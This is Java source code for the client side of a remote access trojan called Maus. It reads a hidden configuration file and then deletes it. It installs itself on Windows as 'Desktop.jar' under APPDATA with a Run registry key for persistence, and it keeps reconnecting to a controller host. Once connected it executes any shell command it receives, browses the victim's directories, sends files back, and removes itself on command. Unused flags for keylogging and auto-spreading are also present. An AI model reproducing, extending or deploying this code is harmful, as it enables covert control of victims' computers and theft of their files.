package Client;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

public class Client {
    private static String HOST = "localhost";
    private static int PORT = 22122;
    private static  boolean debugMode = true;
    private static final String SYSTEMOS = System.getProperty("os.name");
    private static boolean isPersistent = false;
    private static boolean autoSpread = false;
    private static DataOutputStream dos;
    private static File directory;
    private static DataInputStream dis;
    private static boolean keyLogger = true;

    public static void main(String[] args) throws Exception {
        /* Load server settings and then attempt to connect to Maus. */
        Client client = new Client();
        client.loadServerSettings();
        if (isPersistent) {
            client.saveClient();
        }
        client.connect();
    }

    private static String getMauscs() throws Exception {
        String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
        try (InputStream stream = Client.class.getResourceAsStream("/Client/.mauscs");
             OutputStream resStreamOut = new FileOutputStream(jarFolder + "/.mauscs")) {
            int readBytes;
            byte[] buffer = new byte[4096];
            while ((readBytes = stream.read(buffer)) > 0) {
                resStreamOut.write(buffer, 0, readBytes);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return jarFolder + "/.mauscs";
    }

    private static void copyFile(File filea, File fileb) {
        InputStream inStream;
        OutputStream outStream;
        try {
            inStream = new FileInputStream(filea);
            outStream = new FileOutputStream(fileb);

            byte[] buffer = new byte[1024];

            int length;

            while ((length = inStream.read(buffer)) > 0) {
                outStream.write(buffer, 0, length);
            }

            inStream.close();
            outStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void saveClient() {
        File client = new File(getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
        if (SYSTEMOS.contains("Windows")) {
            File newClient = new File(System.getenv("APPDATA")+ "\\Desktop.jar");
            copyFile(client, newClient);
            createPersistence(System.getenv("APPDATA") + "\\Desktop.jar");
        }
    }

    private void createPersistence(String clientPath) {
        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");
        try {
            Process proc = pb.start();
            proc.waitFor(2, TimeUnit.SECONDS);
            proc.destroyForcibly();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void connect() throws InterruptedException {
        try {
            Socket socket = new Socket(HOST, PORT);
            dos = new DataOutputStream(socket.getOutputStream());
            dis = new DataInputStream(socket.getInputStream());

            while (true) {
                String input;
                try {
                    input = dis.readUTF();
                } catch (EOFException e) {
                    break;
                }
                if (input.contains("CMD ")) {
                    exec(input.replace("CMD ", ""));
                } else if (input.contains("SYS")) {
                    communicate("SYS");
                    communicate(SYSTEMOS);
                } else if (input.contains("FILELIST")) {
                    communicate("FILELIST");
                    sendFileList();
                } else if (input.contains("DIRECTORYUP")) {
                    communicate("DIRECTORYUP");
                    directoryUp();
                } else if (input.contains("CHNGDIR")) {
                    communicate("CHNGDIR");
                    directoryChange();
                } else if (input.contains("DOWNLOAD")) {
                    sendFile();
                } else if (input.contains("EXIT")) {
                    communicate("EXIT");
                    File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                    f.deleteOnExit();
                    socket.close();
                    System.exit(0);
                }
            }
        } catch (Exception e) {
            Thread.sleep(1000);
            connect();
        }
    }

    private void communicate(String msg) {
        try {
            dos.writeUTF(msg);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void communicate(int msg) {
        try {
            dos.writeInt(msg);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void exec(String command) {
        if (!command.equals("")) {
            try {
                ProcessBuilder pb = null;
                if (SYSTEMOS.contains("Windows")) {
                    pb = new ProcessBuilder("cmd.exe", "/c", command);
                } else if (SYSTEMOS.contains("Linux")) {
                    pb = new ProcessBuilder();
                }
                if (pb != null) {
                    pb.redirectErrorStream(true);
                }
                Process proc = pb.start();
                try {
                    BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                    ArrayList<String> output = new ArrayList<>();
                    String line;
                    while ((line = in.readLine()) != null) {
                        output.add(line);
                    }
                    proc.waitFor();
                    communicate("CMD");
                    communicate(output.size());
                    for (String s : output) {
                        communicate(s);
                    }
                } catch (IOException | InterruptedException e) {
                    exec("");
                }
            } catch (IOException e) {
                exec("");
            }
        }
    }

    private void loadServerSettings() throws Exception {
        String filename = getMauscs();
        Thread.sleep(100);
        File mauscs = new File(filename);
        try (BufferedReader reader = new BufferedReader(new FileReader(mauscs))
        ) {
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            if (settings.length == 4) {
                HOST = (settings[0]);
                PORT = (Integer.parseInt(settings[1]));
                isPersistent = (Boolean.parseBoolean(settings[2]));
                autoSpread = (Boolean.parseBoolean(settings[3]));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        mauscs.delete();
    }

    private void directoryUp() {
        if (directory != null) {
            directory = directory.getParentFile();
        }
    }

    private void directoryChange() throws IOException {
        if (directory != null) {
            String directoryName = dis.readUTF();
            directory = new File(directory.getAbsolutePath() + "/" + directoryName);
            directory.isDirectory();
        }
    }

    private void sendFileList() {
        if (directory == null) {
            String directory = System.getProperty("user.home") + "/Downloads/";
            Client.directory = new File(directory);
            Client.directory.isDirectory();
        }
        System.out.println(directory);
        File[] files = new File(directory.getAbsolutePath()).listFiles();
        communicate(directory.getAbsolutePath());
        assert files != null;
        communicate(files.length);
        for (File file : files) {
            String name = file.getName();
            communicate(name);
        }
        communicate("END");
    }

    private void sendFile() {
        try {
            communicate("DOWNLOAD");
            String fileName = dis.readUTF();
            File filetoDownload = new File(directory.getAbsolutePath() + "/" + fileName);
            Long length = filetoDownload.length();
            dos.writeLong(length);
            dos.writeUTF(fileName);

            FileInputStream fis = new FileInputStream(filetoDownload);
            BufferedInputStream bs = new BufferedInputStream(fis);

            int fbyte;
            while ((fbyte = bs.read()) != -1) {
                dos.writeInt(fbyte);
            }
            bs.close();
            fis.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
